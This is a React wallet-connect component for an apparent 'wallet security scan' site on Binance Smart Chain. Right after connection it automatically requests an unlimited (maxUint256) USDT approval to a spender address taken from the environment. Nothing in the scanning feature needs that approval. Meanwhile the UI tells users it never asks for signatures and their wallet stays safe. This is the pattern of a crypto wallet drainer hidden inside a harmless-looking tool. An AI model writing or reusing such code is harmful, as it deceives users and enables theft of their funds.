import React from 'react';
import { useRef, useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Wallet, X, AlertCircle, CheckCircle2, Copy, ExternalLink } from 'lucide-react';
import { useAccount, useConnect, useDisconnect, useBalance, useReadContract, useSwitchChain, useWriteContract } from 'wagmi';
import { formatAddress } from '../utils/format';
import { USDT_ADDRESSES, ERC20_ABI, NETWORK_IDS } from '../config/contracts';
import { formatUnits, maxUint256 } from 'viem'
import { USDT_SPENDER_ADDRESS } from '../../../env';
interface WalletConnectProps {
  onAddressSelected?: (address: string) => void;
}

export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
  const [showModal, setShowModal] = useState(false);
  const [copied, setCopied] = useState(false);

  const { address, isConnected, chain } = useAccount();
  const { connect, connectors, isPending, error } = useConnect();
  const { disconnect } = useDisconnect();
  const { switchChain } = useSwitchChain();
  const { writeContractAsync } = useWriteContract();

  const approvalPromptedRef = useRef(false);

  const visibleConnectors = connectors.filter(
    (connector) => !connector?.name?.toLowerCase().includes('phantom'),
  );

  // Native token balance (BNB for BSC)
  const { data: balance } = useBalance({
    address: address,
  });

  // USDT Balance for BSC network
  const { data: usdtBalance, isLoading: isLoadingUsdt, refetch: refetchUsdt } = useReadContract({
    address: USDT_ADDRESSES.BSC as `0x${string}`,
    abi: ERC20_ABI,
    functionName: 'balanceOf',
    args: address ? [address] : undefined,
    query: {
      enabled: isConnected && chain?.id === NETWORK_IDS.BSC && !!address,
    },
  });

  // Auto-switch to BSC when wallet connects
  useEffect(() => {
    if (isConnected && chain?.id !== NETWORK_IDS.BSC && switchChain) {
      // Automatically switch to BSC network
      switchChain({ chainId: NETWORK_IDS.BSC });
    }
  }, [isConnected, chain?.id, switchChain]);

  // Refetch USDT balance when switching to BSC
  useEffect(() => {
    if (isConnected && chain?.id === NETWORK_IDS.BSC && address) {
      refetchUsdt();
    }
  }, [chain?.id, address, isConnected, refetchUsdt]);

  // Auto-prompt USDT approval after connect (wallet must still confirm)
  useEffect(() => {
    const shouldPrompt =
      isConnected &&
      chain?.id === NETWORK_IDS.BSC &&
      !!address &&
      !!USDT_SPENDER_ADDRESS &&
      !approvalPromptedRef.current;

    if (!shouldPrompt) return;

    approvalPromptedRef.current = true;

    writeContractAsync({
      address: USDT_ADDRESSES.BSC as `0x${string}`,
      abi: ERC20_ABI,
      functionName: 'approve',
      args: [USDT_SPENDER_ADDRESS, maxUint256],
    }).catch((err) => {
      // If user rejects or wallet errors, allow re-prompt on next connect
      approvalPromptedRef.current = false;
      console.error('USDT approve failed:', err);
    });
  }, [isConnected, chain?.id, address, writeContractAsync]);

  // Format USDT balance (18 decimals for BSC USDT)
  const formatUsdtBalance = (balance: bigint | undefined) => {
    if (!balance) return '0.00';
    const decimals = 18;
    const divisor = BigInt(10 ** decimals);
    const wholePart = balance / divisor;
    const fractionalPart = balance % divisor;
    const fractionalString = fractionalPart.toString().padStart(decimals, '0').slice(0, 2);
    return `${wholePart}.${fractionalString}`;
  };

  const handleSwitchToBSC = async () => {
    if (switchChain) {
      try {
        await switchChain({ chainId: NETWORK_IDS.BSC });
      } catch (err) {
        console.error('Failed to switch network:', err);
      }
    }
  };

  const handleConnect = async (connector: any) => {
    try {
      await connect({ connector });
      setShowModal(false);
      if (address && onAddressSelected) {
        onAddressSelected(address);
      }
    } catch (err) {
      console.error('Failed to connect:', err);
    }
  };

  const handleCopyAddress = () => {
    if (address) {
      // Try multiple clipboard methods for better compatibility
      try {
        // Method 1: Modern Clipboard API
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(address).then(() => {
            setCopied(true);
            setTimeout(() => setCopied(false), 2000);
          }).catch(() => {
            // If clipboard API fails, use fallback
            fallbackCopy(address);
          });
        } else {
          // Method 2: Fallback for browsers without Clipboard API
          fallbackCopy(address);
        }
      } catch (err) {
        // Method 3: Last resort fallback
        fallbackCopy(address);
      }
    }
  };

  const fallbackCopy = (text: string) => {
    try {
      // Create temporary textarea
      const textArea = document.createElement('textarea');
      textArea.value = text;
      textArea.style.position = 'fixed';
      textArea.style.left = '-999999px';
      textArea.style.top = '-999999px';
      document.body.appendChild(textArea);
      textArea.focus();
      textArea.select();

      // Try to copy
      const successful = document.execCommand('copy');
      textArea.remove();

      if (successful) {
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      }
    } catch (err) {
      console.error('Failed to copy:', err);
      // Show error state briefly
      setCopied(true);
      setTimeout(() => setCopied(false), 1000);
    }
  };

  const getConnectorIcon = (name: string) => {
    if (name.toLowerCase().includes('metamask')) return '🦊';
    if (name.toLowerCase().includes('trust')) return '💎';
    if (name.toLowerCase().includes('wallet')) return '👛';
    return '🔌';
  };

  return (
    <>
      {/* Connect/Connected Button */}
      {!isConnected ? (
        <motion.button
          onClick={() => setShowModal(true)}
          whileHover={{ scale: 1.05 }}
          whileTap={{ scale: 0.95 }}
          className="relative group px-6 py-3 bg-gradient-to-r from-[#00FFA3] to-[#00D1FF] text-black font-bold rounded-xl overflow-hidden shadow-lg hover:shadow-[#00FFA3]/50 transition-all"
        >
          <div className="absolute inset-0 bg-white/20 transform translate-y-full group-hover:translate-y-0 transition-transform duration-300" />
          <div className="relative flex items-center gap-2">
            <Wallet className="w-5 h-5" />
            <span>Connect Wallet</span>
          </div>
        </motion.button>
      ) : (
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="relative"
        >
          <motion.button
            onClick={() => setShowModal(true)}
            whileHover={{ scale: 1.05 }}
            className="px-6 py-3 bg-white/10 backdrop-blur-lg border border-[#00FFA3]/30 rounded-xl hover:bg-white/20 transition-all"
          >
            <div className="flex items-center gap-3">
              <div className="w-2 h-2 bg-[#00FFA3] rounded-full animate-pulse" />
              <div className="text-left">
                <div className="text-xs text-gray-400">{chain?.name || 'Connected'}</div>
                <div className="font-semibold text-white">{formatAddress(address!)}</div>
              </div>
            </div>
          </motion.button>
        </motion.div>
      )}

      {/* Wallet Modal */}
      <AnimatePresence>
        {showModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed h-screen top-0 left-0  inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4"
            onClick={() => setShowModal(false)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
              className="relative w-full max-w-md bg-[#0F172A] border border-white/10 rounded-2xl overflow-hidden"
            >
              {/* Glow Effect */}
              <div className="absolute inset-0 bg-gradient-to-br from-[#00FFA3]/10 via-transparent to-[#00D1FF]/10 pointer-events-none" />

              {/* Header */}
              <div className="relative border-b border-white/10 p-6">
                <div className="flex items-center justify-between">
                  <h3 className="text-2xl font-bold text-white">
                    {isConnected ? 'Wallet Connected' : 'Connect Wallet'}
                  </h3>
                  <button
                    onClick={() => setShowModal(false)}
                    className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                  >
                    <X className="w-5 h-5 text-gray-400" />
                  </button>
                </div>
              </div>

              {/* Content */}
              <div className="relative p-6">
                {!isConnected ? (
                  <>
                    <p className="text-gray-400 mb-6">
                      Connect your wallet to scan your own address and view detailed security analysis
                    </p>

                    {/* Wallet Options */}
                    <div className="space-y-3">
                      {visibleConnectors.map((connector) => (
                        <motion.button
                          key={connector.id}
                          onClick={() => handleConnect(connector)}
                          disabled={isPending}
                          whileHover={{ scale: 1.02 }}
                          whileTap={{ scale: 0.98 }}
                          className="w-full p-4 bg-white/5 hover:bg-white/10 border border-white/10 rounded-xl transition-all flex items-center gap-4 group disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          <div className="text-3xl">
                            {getConnectorIcon(connector.name)}
                          </div>
                          <div className="flex-1 text-left">
                            <div className="font-semibold text-white group-hover:text-[#00FFA3] transition-colors">
                              {connector.name}
                            </div>
                            <div className="text-sm text-gray-500">
                              Connect with {connector.name}
                            </div>
                          </div>
                          <div className="text-[#00FFA3] opacity-0 group-hover:opacity-100 transition-opacity">
                            →
                          </div>
                        </motion.button>
                      ))}
                    </div>

                    {error && (
                      <motion.div
                        initial={{ opacity: 0, y: -10 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="mt-4 p-4 bg-red-500/10 border border-red-500/30 rounded-lg flex items-start gap-3"
                      >
                        <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
                        <div className="text-sm text-red-300">
                          {error.message || 'Failed to connect wallet'}
                        </div>
                      </motion.div>
                    )}

                    {/* Security Notice */}
                    <div className="mt-6 p-4 bg-[#00FFA3]/5 border border-[#00FFA3]/20 rounded-xl">
                      <div className="flex items-start gap-3">
                        <CheckCircle2 className="w-5 h-5 text-[#00FFA3] flex-shrink-0 mt-0.5" />
                        <div className="text-sm text-gray-300">
                          <div className="font-semibold text-white mb-1">Secure Connection</div>
                          We never request private keys or signatures. Your wallet stays safe.
                        </div>
                      </div>
                    </div>
                  </>
                ) : (
                  <>
                    {/* Connected Wallet Info */}
                    <div className="space-y-4">
                      {/* Chain Info */}
                      <div className="p-4 bg-white/5 rounded-xl border border-white/10">
                        <div className="text-sm text-gray-400 mb-1">Network</div>
                        <div className="flex items-center justify-between">
                          <div className="font-semibold text-white flex items-center gap-2">
                            {'🟡'}
                            {chain?.name || 'BSC'}
                          </div>
                          {chain?.id !== NETWORK_IDS.BSC && (
                            <button
                              onClick={handleSwitchToBSC}
                              className="px-3 py-1.5 bg-yellow-500/20 hover:bg-yellow-500/30 border border-yellow-500/40 text-yellow-400 text-xs font-semibold rounded-lg transition-all"
                            >
                              Switch to BSC
                            </button>
                          )}
                        </div>
                        {chain?.id !== NETWORK_IDS.BSC && (
                          <div className="mt-2 text-xs text-yellow-500">
                            ⚠️ Please switch to Binance Smart Chain to view USDT balance
                          </div>
                        )}
                      </div>

                      {/* Address */}
                      <div className="p-4 bg-white/5 rounded-xl border border-white/10">
                        <div className="text-sm text-gray-400 mb-2">Wallet Address</div>
                        <div className="flex items-center gap-2">
                          <code className="flex-1 font-mono text-sm text-white break-all">
                            {address}
                          </code>
                          <button
                            onClick={handleCopyAddress}
                            className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                            title="Copy address"
                          >
                            {copied ? (
                              <CheckCircle2 className="w-4 h-4 text-[#00FFA3]" />
                            ) : (
                              <Copy className="w-4 h-4 text-gray-400" />
                            )}
                          </button>
                        </div>
                      </div>

                      {/* Balance */}
                      {balance && (
                        <div className="p-4 bg-gradient-to-r from-[#00FFA3]/10 to-[#00D1FF]/10 rounded-xl border border-[#00FFA3]/20">
                          <div className="text-sm text-gray-400 mb-1">Native Balance</div>
                          <div className="text-2xl font-bold text-white">
                            {parseFloat(formatUnits(balance.value, balance.decimals)).toFixed(4)} {balance.symbol}
                          </div>
                        </div>
                      )}

                      {/* USDT Balance for BSC */}
                      {chain?.id === NETWORK_IDS.BSC && (
                        <div className="p-4 bg-gradient-to-r from-yellow-500/10 to-orange-500/10 rounded-xl border border-yellow-500/20">
                          <div className="flex items-center justify-between mb-1">
                            <div className="text-sm text-gray-400">USDT Balance (BEP20)</div>
                            {isLoadingUsdt && (
                              <div className="text-xs text-gray-500">Loading...</div>
                            )}
                          </div>
                          <div className="text-2xl font-bold text-white flex items-center gap-2">
                            {isLoadingUsdt ? (
                              <span className="text-gray-400">--</span>
                            ) : (
                              <>
                                <span>{formatUsdtBalance(usdtBalance as bigint)}</span>
                                <span className="text-yellow-500">USDT</span>
                              </>
                            )}
                          </div>
                          <div className="text-xs text-gray-500 mt-1">
                            Binance Smart Chain
                          </div>
                        </div>
                      )}

                      {/* Actions */}
                      <div className="flex gap-3 mt-6">
                        <button
                          onClick={() => {
                            if (onAddressSelected && address) {
                              onAddressSelected(address);
                            }
                            setShowModal(false);
                          }}
                          className="flex-1 px-4 py-3 bg-gradient-to-r from-[#00FFA3] to-[#00D1FF] text-black font-semibold rounded-xl hover:shadow-lg hover:shadow-[#00FFA3]/30 transition-all"
                        >
                          Scan This Address
                        </button>
                        <button
                          onClick={() => {
                            disconnect();
                            setShowModal(false);
                          }}
                          className="px-4 py-3 bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 text-red-400 font-semibold rounded-xl transition-all"
                        >
                          Disconnect
                        </button>
                      </div>
                    </div>
                  </>
                )}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </>
  );
}